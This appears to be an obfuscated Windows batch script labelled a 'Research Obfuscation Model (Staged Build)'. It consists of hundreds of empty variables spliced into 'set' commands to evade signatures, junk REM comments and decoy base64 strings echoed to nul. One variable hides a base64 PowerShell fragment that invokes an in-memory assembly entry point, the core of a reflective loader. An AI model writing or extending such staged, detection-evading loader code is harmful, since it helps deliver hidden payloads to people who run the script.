@echo off
set ASp=
set ASrJ=
set AdOR=
set AerJM=
set AjQ=
set Ave=
set AzkaJ=
set BLUPf=
set BMp=
set BPPnf=
set BPsXe=
set BTFM=
set BoCAF=
set BrcOi=
set BwG=
set BwXTM=
set CAifb=
set CBjr=
set CHF=
set CKhf=
set Cnkl=
set CrPI=
set CsIQv=
set CwV=
set DAP=
set DAWvz=
set DMge=
set DRIde=
set DUl=
set DUrGP=
set DcIl=
set DgYJ=
set DrPj=
set DxYDo=
set DxcaQ=
set ECDCM=
set ELs=
set EMEx=
set EXq=
set EZp=
set EbuB=
set Elbg=
set EwJ=
set EwkIy=
set FLtaW=
set FQu=
set FUtC=
set FqF=
set Frq=
set FslhG=
set FxbG=
set GFb=
set GQH=
set GRtWs=
set GTna=
set GXtWe=
set GfW=
set GfZke=
set Gvs=
set GxqOw=
set HFz=
set HZQD=
set Hbe=
set HdUkq=
set HmW=
set HoYQ=
set HqEPx=
set HrY=
set Hxd=
set Hxl=
set HyN=
set HzCFh=
set IBS=
set IIcJ=
set IJPiC=
set ITB=
set IUm=
set Ilo=
set ItgGo=
set Itidp=
set Itv=
set Iwn=
set JCAG=
set JLx=
set JWR=
set JbBF=
set JcKyP=
set JsgR=
set JxMB=
set JywOa=
set KEMA=
set KElT=
set KHQ=
set KIgC=
set KJZ=
set KLnvk=
set KNA=
set KbJ=
set KkHWf=
set KsC=
set KuL=
set Kwqx=
set LLmq=
set LQNVs=
set LUDCZ=
set LfTwF=
set Lkdy=
set MLNdJ=
set MPmAR=
set MVGAX=
set MYC=
set MYeU=
set Mjf=
set MlpGb=
set MnjJm=
set MuiHb=
set NNZc=
set NWx=
set NnJ=
set Ntu=
set OBRMF=
set OCwS=
set OMb=
set OSQG=
set OXyE=
set OcBU=
set OdAM=
set Odplg=
set OtBx=
set OwUx=
set PBD=
set PEtx=
set PFccW=
set PMhU=
set PVRX=
set PXOln=
set PiAiY=
set PkG=
set PqF=
set PusjK=
set Pzt=
set QEKi=
set QrSy=
set QwH=
set RDTxt=
set RILy=
set ROHfr=
set RVO=
set RVi=
set RZHCU=
set Rdck=
set RhweI=
set RiO=
set RwJVt=
set RwK=
set RyJHL=
set SKjX=
set SUZ=
set SeAl=
set SiJlo=
set Sja=
set Sknvd=
set SmgL=
set SvI=
set SvekX=
set SyH=
set TCYIB=
set TMh=
set TOfaq=
set TgsLZ=
set TrGL=
set TzIq=
set TzTM=
set URXn=
set UTFH=
set UUfe=
set UlGM=
set UrCD=
set VCXU=
set VHgR=
set VNbh=
set VNq=
set VYSPs=
set VZf=
set VcyI=
set Vjp=
set VmExD=
set VmzFA=
set VrX=
set VuoLr=
set Vupti=
set Vur=
set Vvb=
set VzNT=
set WEljb=
set WHTI=
set WHrtO=
set WQEk=
set WTHN=
set WZtO=
set WbAp=
set WbF=
set Wde=
set WpeZG=
set Wqq=
set WrNH=
set WvV=
set XBLrLBsMMOWD=
set XGMem=
set XNMX=
set XOjI=
set XQNuz=
set XVaU=
set XjB=
set XnXdO=
set YAm=
set YAnG=
set YIZH=
set YQNP=
set Yeq=
set Yfr=
set Yimg=
set Ypd=
set YtOb=
set ZQNuu=
set ZbLml=
set ZdKeV=
set ZegAI=
set ZmK=
set ZsVbP=
set aFNFj=
set aOmB=
set aZLKb=
set aaP=
set aalFO=
set atmz=
set bJNaK=
set bJr=
set bREx=
set bTLF=
set bWcjt=
set bXMKv=
set bcjoi=
set biaqR=
set bmc=
set btaw=
set cEF=
set cEsY=
set cVsnl=
set cWED=
set cit=
set coZiH=
set cohzq=
set crNXx=
set ctZb=
set cvrDE=
set dDm=
set dMb=
set dVX=
set dVa=
set dZtc=
set dqeX=
set dwJ=
set eIrMs=
set eKjek=
set eLDDj=
set eMkr=
set eMld=
set eUU=
set ecn=
set edX=
set eiXG=
set epLns=
set erdRe=
set ezZPa=
set fHYRb=
set fJgT=
set fVQ=
set fhUfb=
set fvOYr=
set gFBO=
set gOC=
set gUSn=
set gUb=
set gWu=
set ggEZr=
set ggJy=
set ggd=
set gqqi=
set gtUj=
set guGD=
set hDn=
set hMHk=
set hWfwF=
set hbeZ=
set hdBYk=
set iBdlP=
set iIB=
set iIM=
set iJVo=
set iJt=
set iQPoe=
set icZ=
set iePKh=
set iijc=
set jHna=
set jIMRh=
set jTg=
set jbSd=
set jbh=
set jkQE=
set jqCrx=
set jtp=
set jyHV=
set kBA=
set kMwlc=
set kOthk=
set kVl=
set kgxIr=
set lBF=
set lBU=
set lXR=
set lZYD=
set ljq=
set lkf=
set lkzoq=
set llq=
set lwd=
set mFEtw=
set mMT=
set mbQw=
set mcqn=
set meojz=
set mzyQg=
set nHd=
set nOSdJ=
set nPmLd=
set nRo=
set nbx=
set nqw=
set nzhij=
set oAo=
set oKy=
set oYile=
set oZpmg=
set opFId=
set owuVK=
set pBfQ=
set pCOay=
set pEc=
set pJE=
set pOE=
set pcDb=
set pcm=
set pfQ=
set prFTh=
set pttU=
set puCaT=
set qOG=
set qPW=
set qUL=
set qZxLT=
set qgP=
set qro=
set qwGC=
set qwfeV=
set rBHRE=
set rHRA=
set rPYfY=
set rSS=
set rcT=
set rcmeV=
set rfR=
set rqO=
set sDno=
set sRR=
set sTiei=
set sXhr=
set saKQ=
set sbiD=
set sdpP=
set szme=
set tAvk=
set tFV=
set tIY=
set tJip=
set tNST=
set tRQSn=
set tgOk=
set thKi=
set tvAgp=
set uDCx=
set uJmO=
set uMQ=
set uOr=
set uRFY=
set uWyn=
set ubFx=
set uhlZL=
set ujZyb=
set uvcXa=
set uzo=
set vEe=
set vFs=
set vPg=
set vShw=
set vcu=
set viXjs=
set vjgF=
set vjsG=
set vrDB=
set vuwk=
set wBG=
set wGa=
set wRJY=
set wqEUl=
set wyLM=
set xJCwM=
set xKK=
set xRt=
set xWhjD=
set xsp=
set yAfVq=
set yBDSG=
set yCA=
set yFk=
set yKPpS=
set yRW=
set yURfZ=
set yYd=
set ybvld=
set yhIr=
set ymT=
set ymgu=
set yot=
set yunfC=
set zHSzi=
set zOMAn=
set zTJyf=
set zfHh=
set zkIG=
set ztp=
set zyRuz=

REM --- Research Obfuscation Model (Staged Build) ---
sE%Itv%T "COFjNdz=AXKWWiuPiJHJlPnDkoLS"
REM zenith mirage hawk core
sE%OCwS%t "EZLMVYYIo=waClicMztQJdIEwHKIgEWvwH"
sE%nbx%t "wdsgNVBp=OVAIbaIrFpfLGbhFPnFyuymRtSZWyL"
echo RzVIMUxnMDRHU2NoYUxUUmtub0FteTBlbE5oTldsUUI3RG9CeVNQdGoxZEM= >nul 2>&1
REM cipher valley hawk echo
Se%ASrJ%T "DtnuszAjdQd=lkwXVnKlfoKmjUc"
echo c1hZQW45UnkzdGd0NXpqN0VkMFJQZGN5Y08xWlB3TzRZYXVLYlF6NHdoQ2RhMGd1cU5SdA== >nul 2>&1
REM pixel phantom kappa delta pixel zenith glimmer
echo c0I0d0lxNFYwYjV0bUJpbFpXTGR0d2dZb0NLY2ZIalZKQ29LUUJaQ3BjOUhXeTdjMk9WUDZZT2Jtd3FK >nul 2>&1
sE%vEe%t "FjzMAJVUR=qDgAIMwGGJyR"
echo VDFmQ1Q5aXM3bU9jdURobmJudGNIWWZWZTZqcFUxMnJPeXBmMUlCRTNXVDlGeDByM1V1MzhieXJ5cjlCQ0NFUVhSd21o >nul 2>&1
Se%MVGAX%T "EThljejEHkQ=cYtBFKeDZLrQwk"
se%XNMX%T "BjZOIksch=gnjZONvsXBReuoOcsxlP"
REM mirage hawk twilight guard guard glimmer odyssey phantom
echo eDZ5V1Z1MVROejJyclJ4RmZLY0gwNXdpSHhOS2ZFSjBRRTQ5TXppZmJtT3hZMw== >nul 2>&1
SE%jIMRh%T "WVOABpFlAAAp=UZPqghLstJqtHCkHTdEygXbdvpLKvPL"
REM clearing clearing kappa glimmer delta binary strobe vertex twilight
REM lance vision zenith lance
sE%IJPiC%T "DVWGjrUH=YlRfaLWzgTwGkdluoiwWiHobvZJMpEBjbTA"
REM phantom vision zenith zenith glimmer undergrowth twilight kiln vertex
se%uvcXa%T "hNDDNhjwLs=IdiigOFZiiQILdZnuSdSO"
Se%LLmq%T "cbcIhZXeBTvNfP=aEEOwqLFwBiwcanHjhvyXWSx"
REM core hawk clearing kappa beacon
echo eTdqYlROSXVkbDVMWmVuVmdmcFZBb3gwTXJrSmhUVWk4MktsNDNKekJtc3JWZkNpOERibGx4aGFtVTUxeU1SYkhlYlR1NWp0V092bVFxWg== >nul 2>&1
echo OFk1bkh5Y1pibzRwMGRnRENpbHdLWVRhRmlYVGI2eXpMU0ZEaWFLY3BhcHd1Y1ZUNVA2VkdPZEttR3hueHM4M1pEOUdK >nul 2>&1
SE%HqEPx%T "IjYHuiINW=eMvzfpEqjQTVCOPbZLaiGzvhQkntMmw"
se%eUU%T "bNnVaWfXhzcE=kHegpSaetmisXBXzxQrgKHurGCOz"
Se%RVi%T "FBWVTaBEXjEkxt=zXaqKIBbPxHIlrMmUooGkWRuB"
REM zenith fragment core twilight strobe
REM ruby core beacon echo clearing vision vertex hawk
echo azB6b1Z4b0JsUXJmOU9NbjBsenF6NlFIYXVjZU9jb3l6M0ViWU5hMk96YXNPdjk0cWZ5WnpXUm02bU9M >nul 2>&1
REM zenith ruby echo fragment twilight
REM kiln valley kappa delta fragment
REM valley shadow pixel
sE%KsC%t "zAcBbsSK=YTzXKzkzBmyRoSxHmugWtuyugWykrQegWzr"
REM cipher phantom beacon binary circle
echo OHRuTXY1RVc1SDdiVFVOTHQ4TkwzOW51T3J4U2FPWGdXdFp6cGl3THZ3dzV2U2ZWT2JBYWs= >nul 2>&1
Se%HmW%t "cxoyqnMcbU=kKfSBlbHNlIHsKJHN0YXJyID0gW3N0cmluZ1tdXUAoKQokZW50cnkuSW52b2tlKCRudWxsLCBAKCwkc3RhcnIpKQp9CkxvZy1TaWxlbnQgIlsrXSBFbnRyeVBvaW50IHJldHVybmVkLiIgIkdyZWVuIgp9IGVsc2UgewpMb2c"
se%Yimg%T "RfBUatMrp=KjilGdTGjkTipNYibeeQ"
REM mirage zenith undergrowth
